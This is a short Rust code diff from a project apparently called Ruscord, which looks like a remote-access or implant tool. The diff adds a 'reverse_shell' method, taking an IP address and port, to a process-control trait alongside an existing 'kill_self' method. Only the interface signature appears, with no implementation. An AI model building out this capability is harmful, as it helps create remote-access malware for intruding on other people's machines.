@@ -36,6 +36,8 @@ pub mod recon {
 }
 
 pub mod process {
+	use std::{future::Future, net::IpAddr, pin::Pin};
+
 	use crate::RuscordError;
 
 	pub trait ProcessModule {
@@ -52,5 +54,10 @@ pub mod process {
 		///
 		/// If no exit code is provided, a default exit code of 0 will be used.
 		fn kill_self(&self, exit_code: Option<u32>) -> !;
+
+		/// Spawns a reverse shell
+		fn reverse_shell(
+			&self, ip: IpAddr, port: u16,
+		) -> Pin<Box<dyn Future<Output = Result<(), RuscordError>> + Send + Sync>>;
 	}
 }
